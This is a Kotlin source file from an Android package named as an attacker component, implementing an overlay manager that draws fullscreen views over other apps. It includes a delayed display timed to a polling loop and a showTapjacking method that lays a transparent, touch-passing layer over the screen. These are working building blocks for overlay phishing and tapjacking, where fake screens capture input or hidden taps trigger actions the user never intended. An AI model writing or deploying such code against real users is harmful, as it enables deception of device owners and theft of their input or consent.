package com.ghosttouch.attacker.overlay

import android.content.Context
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import androidx.compose.runtime.Composable
import androidx.compose.ui.platform.ComposeView
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import androidx.lifecycle.setViewTreeLifecycleOwner
import androidx.savedstate.SavedStateRegistry
import androidx.savedstate.SavedStateRegistryController
import androidx.savedstate.SavedStateRegistryOwner
import androidx.savedstate.setViewTreeSavedStateRegistryOwner

/**
 * Manages the lifecycle of overlay views drawn on top of other apps.
 *
 * ## Race condition prevention
 * A pending flag [isPending] is set immediately when [show] is called, preventing
 * the polling loop from queueing duplicate overlays during the delay window.
 * The pending delayed runnable is tracked and can be cancelled via [cancelPending].
 *
 * @param context Application context (must be app context for WindowManager).
 */
class OverlayManager(private val context: Context) {

    companion object {
        private const val TAG = "OverlayManager"
    }

    private val windowManager: WindowManager =
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    private var currentOverlay: ComposeView? = null
    private var lifecycleOwner: OverlayLifecycleOwner? = null
    private val handler = Handler(Looper.getMainLooper())

    /** Tracks the pending delayed show runnable so it can be cancelled. */
    private var pendingShowRunnable: Runnable? = null

    /** Set to true as soon as show() is called, before the delay. */
    @Volatile
    private var isPending = false

    /**
     * Whether an overlay is currently displayed OR pending display.
     * This prevents the polling loop from triggering duplicate show() calls
     * during the delay window.
     */
    val isShowing: Boolean get() = currentOverlay != null || isPending

    /**
     * Whether the overlay is actually visible on screen (not just pending).
     */
    val isVisible: Boolean get() = currentOverlay != null

    /**
     * Shows a fullscreen overlay with the given Compose content.
     *
     * Sets [isPending] immediately to prevent race conditions with the polling loop.
     * The actual view is added after [delayMs] milliseconds.
     *
     * @param delayMs Delay before showing the overlay (300-500ms is realistic).
     * @param content The Compose content to render in the overlay.
     */
    fun show(delayMs: Long = 400, content: @Composable () -> Unit) {
        if (isShowing) return

        // Set pending flag IMMEDIATELY — this prevents polling re-triggers
        isPending = true
        Log.d(TAG, "Overlay show() called — pending=true, will display in ${delayMs}ms")

        val runnable = Runnable { showImmediate(content) }
        pendingShowRunnable = runnable
        handler.postDelayed(runnable, delayMs)
    }

    /**
     * Cancels a pending overlay that hasn't been displayed yet.
     * No-op if the overlay is already visible.
     */
    fun cancelPending() {
        pendingShowRunnable?.let { handler.removeCallbacks(it) }
        pendingShowRunnable = null
        isPending = false
        Log.d(TAG, "Pending overlay cancelled")
    }

    /**
     * Shows the overlay immediately without delay.
     * Must be called on the main thread.
     */
    private fun showImmediate(content: @Composable () -> Unit) {
        pendingShowRunnable = null

        if (currentOverlay != null) {
            isPending = false
            return
        }

        // Create lifecycle owner for Compose in service context
        val owner = OverlayLifecycleOwner()
        lifecycleOwner = owner

        val composeView = ComposeView(context).apply {
            setViewTreeLifecycleOwner(owner)
            setViewTreeSavedStateRegistryOwner(owner)
            setContent(content)
        }

        // Window layout params for fullscreen overlay
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
        }

        try {
            windowManager.addView(composeView, params)
            currentOverlay = composeView
            isPending = false
            owner.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_START)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
            Log.d(TAG, "Overlay displayed successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show overlay: ${e.message}")
            currentOverlay = null
            lifecycleOwner = null
            isPending = false
        }
    }

    /**
     * Shows a transparent/tapjacking overlay.
     * Uses FLAG_NOT_FOCUSABLE so touches pass through.
     */
    fun showTapjacking(content: @Composable () -> Unit) {
        if (isShowing) return

        isPending = true

        val owner = OverlayLifecycleOwner()
        lifecycleOwner = owner

        val composeView = ComposeView(context).apply {
            setViewTreeLifecycleOwner(owner)
            setViewTreeSavedStateRegistryOwner(owner)
            setContent(content)
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
        }

        try {
            windowManager.addView(composeView, params)
            currentOverlay = composeView
            isPending = false
            owner.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_START)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
        } catch (_: Exception) {
            currentOverlay = null
            lifecycleOwner = null
            isPending = false
        }
    }

    /**
     * Removes the currently displayed overlay from the screen.
     * Also cancels any pending show that hasn't fired yet.
     */
    fun hide() {
        // Cancel any pending show first
        cancelPending()

        currentOverlay?.let { view ->
            try {
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
                windowManager.removeView(view)
                Log.d(TAG, "Overlay hidden")
            } catch (_: Exception) {
                // View may have already been removed
            }
        }
        currentOverlay = null
        lifecycleOwner = null
    }
}

/**
 * Custom lifecycle owner for Compose views running in a Service context.
 */
internal class OverlayLifecycleOwner : LifecycleOwner, SavedStateRegistryOwner {

    private val lifecycleRegistry = LifecycleRegistry(this)
    private val savedStateRegistryController = SavedStateRegistryController.create(this)

    override val lifecycle: Lifecycle get() = lifecycleRegistry
    override val savedStateRegistry: SavedStateRegistry
        get() = savedStateRegistryController.savedStateRegistry

    init {
        savedStateRegistryController.performRestore(null)
    }

    fun handleLifecycleEvent(event: Lifecycle.Event) {
        lifecycleRegistry.handleLifecycleEvent(event)
    }
}
